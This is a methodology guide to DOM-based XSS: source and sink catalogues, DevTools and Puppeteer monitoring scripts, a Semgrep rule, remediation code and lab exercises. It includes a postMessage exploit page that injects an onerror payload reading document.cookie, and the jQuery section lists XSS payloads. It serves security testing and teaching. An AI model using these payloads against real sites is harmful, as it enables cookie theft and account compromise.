# DOM XSS Source/Sink Analysis Guide

> Systematic methodology for identifying DOM-based XSS vulnerabilities through source/sink mapping, taint tracking, and automated discovery using browser DevTools and specialized tooling.

## Introduction

DOM-based XSS is fundamentally different from reflected and stored XSS because the entire vulnerability exists on the client side. The server never sees the malicious payload -- it never leaves the browser. This makes DOM XSS invisible to server-side WAFs, intrusion detection systems, and traditional log analysis. Detecting and exploiting DOM XSS requires understanding how data flows through the browser's Document Object Model.

The core concept is the source-to-sink model. A **source** is any DOM property or API that can contain attacker-controlled data. A **sink** is any function or DOM operation that can execute code or inject HTML. A DOM XSS vulnerability exists when there is an unvalidated path from a source to a dangerous sink.

This guide covers manual analysis techniques, automated tooling, and practical exploitation methods. Mastering source/sink analysis is essential for testing single-page applications (SPAs), progressive web apps, and any JavaScript-heavy application where traditional server-side XSS scanning falls short.

## 1. Understanding Sources and Sinks

Sources are DOM properties where attacker-controlled data enters the application. Sinks are dangerous functions that execute or render that data. Understanding the complete catalog of sources and sinks is the foundation of DOM XSS analysis.

### Complete Source Catalog

Sources are entry points where attacker data enters the DOM. Each source has different accessibility constraints and encoding requirements.

```javascript
// Tier 1: Direct URL control (highest priority targets)
document.URL           // Full URL including query string and hash
document.documentURI   // Same as document.URL in most browsers
location.href          // Full URL (read/write)
location.search        // Query string (everything after ?)
location.hash          // Fragment identifier (everything after #)
location.pathname      // Path component of the URL
location.hostname      // Hostname portion

// Tier 2: Cross-origin transfer mechanisms
window.name            // Persistent across navigations (up to 2MB)
document.referrer      // URL of the referring page (can be controlled via redirect)
postMessage data       // Cross-origin messaging API
message event.data     // Data received via postMessage

// Tier 3: Storage and cookie sources
document.cookie        // If cookies contain reflected data
localStorage           // If previously stored attacker data
sessionStorage         // Same as localStorage but session-scoped

// Tier 4: Indirect sources (require chaining)
Web Worker messages    // Data from worker threads
SharedArrayBuffer      // Shared memory between contexts
BroadcastChannel       // Cross-tab communication
```

**Source Risk Assessment**: Not all sources are equally exploitable. `location.hash` is the highest-risk source because it is fully attacker-controlled, never sent to the server (invisible to WAFs), and frequently used for client-side routing. `window.name` is also high-risk because it persists across cross-origin navigations, enabling cross-site data smuggling.

### Complete Sink Catalog

Sinks are the dangerous endpoints where attacker-controlled data can cause code execution or HTML injection. Each sink has a specific exploitation method depending on the output context.

```javascript
// Tier 1: Direct code execution (most dangerous)
eval()                     // Evaluates string as JavaScript
setTimeout(string, ...)    // Evaluates string argument as code
setInterval(string, ...)   // Evaluates string argument as code
Function(string)           // Creates new function from string
new Function(string)       // Constructor form
requestAnimationFrame(string) // Some browsers eval the string argument

// Tier 2: HTML injection (dangerous DOM manipulation)
document.write()           // Writes HTML directly to document stream
document.writeln()         // Same as write() with newline
element.innerHTML          // Parses and injects HTML
element.outerHTML          // Replaces element with parsed HTML
element.insertAdjacentHTML()  // Injects HTML at specified position
document.createContextualFragment() // Parses HTML string to DocumentFragment

// Tier 3: URL-based execution (navigation sinks)
location.href = ...        // Navigation (javascript: URI executes code)
location.assign(...)       // Same as setting location.href
location.replace(...)      // Navigation with history replacement
location = ...             // Implicit location.href assignment

// Tier 4: jQuery-specific sinks (when jQuery is present)
$(selector)               // Selector injection from user input
$.html(userInput)         // innerHTML equivalent
$.append(userInput)       // DOM injection
$.prepend(userInput)      // DOM injection before children
$.after(userInput)        // DOM injection after element
$.before(userInput)       // DOM injection before element
$.globalEval(userInput)   // Explicit eval equivalent
```

**Sink Severity Ranking**: `eval()` and `Function()` sinks are the most severe because they execute raw JavaScript without any HTML parsing. `innerHTML` and `document.write()` are next because they allow full HTML injection including script tags. URL-based sinks require `javascript:` URI scheme but are equally dangerous in practice.

## 2. Manual Taint Tracking with DevTools

Use Chrome DevTools to trace data flow from source to sink.

```javascript
// Step 1: Set breakpoints on known sinks
// In Console, override dangerous functions:
const originalWrite = document.write;
document.write = function(content) {
  console.trace('document.write called with:', content);
  debugger;
  return originalWrite.apply(this, arguments);
};

// Monitor innerHTML assignments via MutationObserver
const observer = new MutationObserver((mutations) => {
  mutations.forEach((m) => {
    if (m.type === 'childList' && m.addedNodes.length) {
      console.trace('DOM modified:', m.target, m.addedNodes);
    }
  });
});
observer.observe(document.body, { childList: true, subtree: true });
```

## 3. Automated Discovery with DOM Invader

Burp Suite's DOM Invader automates source/sink detection.

```bash
# Enable DOM Invader in Burp's embedded browser
# 1. Open Burp > Proxy > Intercept > Open Browser
# 2. Navigate to target application
# 3. Open DevTools > DOM Invader tab
# 4. Enable "Sources" and "Sinks" toggles
# 5. Inject canary into URL fragment:
https://target.com/page#<dom-invader-canary>

# DOM Invader will highlight:
# - Which sources contain the canary
# - Which sinks the canary reaches
# - The full taint flow path
```

## 4. Static Analysis with Semgrep

```bash
# Install semgrep and run DOM XSS rules
pip install semgrep

# Custom rule for innerHTML assignment from URL params
cat > dom-xss-rules.yaml << 'EOF'
rules:
  - id: dom-xss-innerhtml-from-url
    patterns:
      - pattern: |
          $EL.innerHTML = $EXPR
      - metavariable-pattern:
          metavariable: $EXPR
          patterns:
            - pattern-either:
              - pattern: location.hash
              - pattern: location.search
              - pattern: document.URL
              - pattern: new URLSearchParams(...).get(...)
    message: "Potential DOM XSS: URL-controlled data flows to innerHTML"
    severity: ERROR
    languages: [javascript, typescript]
EOF

semgrep --config dom-xss-rules.yaml ./src/
```

## 5. Exploiting postMessage Sinks

```javascript
// Identify postMessage listeners
// In DevTools Console:
const listeners = getEventListeners(window);
console.log('message listeners:', listeners.message);

// Check if origin validation is missing or weak:
// Vulnerable pattern:
window.addEventListener('message', function(e) {
  // No origin check!
  document.getElementById('output').innerHTML = e.data.html;
});

// Exploitation from attacker page:
<iframe src="https://vulnerable.com/page" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    this.contentWindow.postMessage(
      {html: '<img src=x onerror=alert(document.cookie)>'},
      '*'
    );
  };
</script>
```

## 6. jQuery Sink Detection

jQuery introduces additional sinks beyond native DOM APIs. Because jQuery is present on over 75% of websites, jQuery-specific sinks are a critical part of DOM XSS analysis.

```javascript
// jQuery introduces additional sinks
// Dangerous jQuery methods:
$(location.hash)           // Selector injection
$('<img src=x onerror=...>')  // HTML creation
$.html(userInput)          // innerHTML equivalent
$.append(userInput)        // DOM injection
$.globalEval(userInput)    // eval equivalent
```

### jQuery Version-Specific Vulnerabilities

Different jQuery versions have different attack surfaces. The `$()` selector function is the most commonly exploited sink.

| jQuery Version | Vulnerability | Exploit |
|---------------|---------------|---------|
| < 1.9 | `$()` selector executes `<script>` tags | `$(location.hash)` with HTML payload |
| < 3.0 | `$.parseHTML()` does not sanitize | `$.parseHTML('<img src=x onerror=alert(1)>')` |
| < 3.5 | `$.htmlPrefilter()` passes through `</script>` | Regex-based bypass of sanitization |
| All versions | `$.globalEval()` always executes | `$.globalEval(userInput)` |

### Detection Script for jQuery Sinks

Paste this monitoring script in DevTools Console to intercept all jQuery DOM manipulation calls during testing:

```javascript
// Detection script for jQuery sink usage:
// Paste in DevTools Console
const jqSinks = ['html', 'append', 'prepend', 'after', 'before',
                 'replaceWith', 'wrap', 'wrapAll', 'wrapInner'];
jqSinks.forEach(method => {
  const orig = $.fn[method];
  $.fn[method] = function() {
    console.trace(`jQuery.${method} called:`, arguments[0]);
    return orig.apply(this, arguments);
  };
});

// Also monitor $() selector for HTML string injection
const origJq = window.jQuery;
window.jQuery = function(selector) {
  if (typeof selector === 'string' && selector.includes('CANARY')) {
    console.trace('jQuery selector called with potential payload:', selector);
  }
  return origJq.apply(this, arguments);
};
```

## 7. Building a Taint Flow Map

```bash
# Use retire.js to find vulnerable JS libraries
npm install -g retire
retire --js --path ./public/js/

# Use puppeteer for automated crawling and sink detection
cat > dom-xss-scanner.js << 'EOF'
const puppeteer = require('puppeteer');

async function scanForDOMXSS(url) {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();

  // Inject monitoring before page loads
  await page.evaluateOnNewDocument(() => {
    window.__xss_sinks = [];
    const origWrite = document.write;
    document.write = function(s) {
      window.__xss_sinks.push({sink: 'document.write', value: s});
      return origWrite.apply(this, arguments);
    };
  });

  // Test with canary in various sources
  const canary = 'XSS_CANARY_12345';
  await page.goto(`${url}#${canary}`);
  await page.waitForTimeout(2000);

  const results = await page.evaluate(() => window.__xss_sinks);
  const hits = results.filter(r => r.value.includes('XSS_CANARY_12345'));

  console.log(`Found ${hits.length} source-to-sink flows`);
  hits.forEach(h => console.log(`  Sink: ${h.sink}`));

  await browser.close();
}

scanForDOMXSS(process.argv[2]);
EOF
node dom-xss-scanner.js https://target.com/app
```

## 8. Remediation Verification

After identifying DOM XSS vulnerabilities, verify that remediations are effective by re-testing the complete source-to-sink path.

```javascript
// Safe alternatives to dangerous sinks:

// Instead of innerHTML, use textContent:
element.textContent = userInput;  // Safe: no HTML parsing

// Instead of document.write, use DOM APIs:
const el = document.createElement('div');
el.textContent = userInput;
document.body.appendChild(el);

// For postMessage, always validate origin:
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  // Process only after origin validation
});

// Use DOMPurify for cases requiring HTML rendering:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

## Hands-on Exercises

### Exercise 1: Manual Source/Sink Discovery

**Objective**: Identify all sources and sinks in a single-page application using only browser DevTools.

**Setup**: Deploy a local instance of OWASP Juice Shop or DVWA with DOM XSS challenges.

1. Open the target application in Chrome DevTools
2. Open the Console and inject the `document.write` and `innerHTML` monitoring scripts from Section 2
3. Navigate to a page with URL-driven content (e.g., search results, product details)
4. Inject a canary string (`TEST_CANARY_12345`) into `location.hash`, `location.search`, and `document.referrer`
5. Check the Console for any sink invocations that contain your canary
6. Document each source-to-sink path you discover, including the full JavaScript call stack
7. For each path, construct a proof-of-concept payload that executes `alert(document.domain)`

### Exercise 2: postMessage Exploitation Lab

**Objective**: Find and exploit a postMessage handler with missing or weak origin validation.

**Setup**: Create a local test page with a vulnerable postMessage listener, or use PortSwigger's DOM XSS labs.

1. Identify all `window.addEventListener('message', ...)` handlers in the target application
2. For each handler, check whether `event.origin` is validated against a strict allowlist
3. If origin validation is missing, create an attacker page that sends a malicious message to the target via an iframe
4. Test with increasing payload complexity: plain text, HTML injection, full script execution
5. Document the exploitation chain including the exact message format required

### Exercise 3: Automated Scanner Development

**Objective**: Build a custom Puppeteer-based DOM XSS scanner that tests multiple injection points automatically.

1. Extend the scanner script from Section 7 to support multiple canary injection points (hash, search, referrer, window.name)
2. Add sink detection for `innerHTML`, `outerHTML`, `insertAdjacentHTML`, and `eval`
3. Implement result reporting with the source, sink, and confidence level for each finding
4. Test your scanner against known-vulnerable applications and measure the detection rate
5. Compare your scanner's results with Burp DOM Invader's findings

## References

- **PortSwigger DOM XSS Labs**: https://portswigger.net/web-security/dom-based -- Structured labs covering all DOM XSS subtypes with interactive exercises.
- **DOMPurify Repository**: https://github.com/cure53/DOMPurify -- The gold-standard HTML sanitizer; understanding its code teaches defense techniques.
- **Browser Security Handbook (Source/Sink Reference)**: https://code.google.com/archive/p/browsersec/ -- Comprehensive reference on browser security mechanisms.
- **DOM Invader Documentation**: https://portswigger.net/burp/documentation/desktop/tools/dom-invader -- Burp Suite's automated DOM XSS discovery tool.
- **Semgrep JavaScript Rules**: https://semgrep.dev/p/javascript -- Static analysis rules for detecting DOM XSS patterns in source code.
- **Retire.js**: https://retirejs.github.io/retire.js/ -- Tool for detecting use of JavaScript libraries with known DOM XSS vulnerabilities.
- **OWASP DOM Based XSS**: https://owasp.org/www-community/attacks/DOM_Based_XSS -- OWASP's official documentation on DOM XSS attack patterns.
- **Google Web Security Academy**: https://web.dev/secure/ -- Best practices for secure web development including DOM manipulation patterns.

```javascript
// Safe alternatives to dangerous sinks:
// Instead of innerHTML, use textContent:
element.textContent = userInput;  // Safe: no HTML parsing

// Instead of document.write, use DOM APIs:
const el = document.createElement('div');
el.textContent = userInput;
document.body.appendChild(el);

// For postMessage, always validate origin:
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  // Process only after origin validation
});

// Use DOMPurify for cases requiring HTML rendering:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```
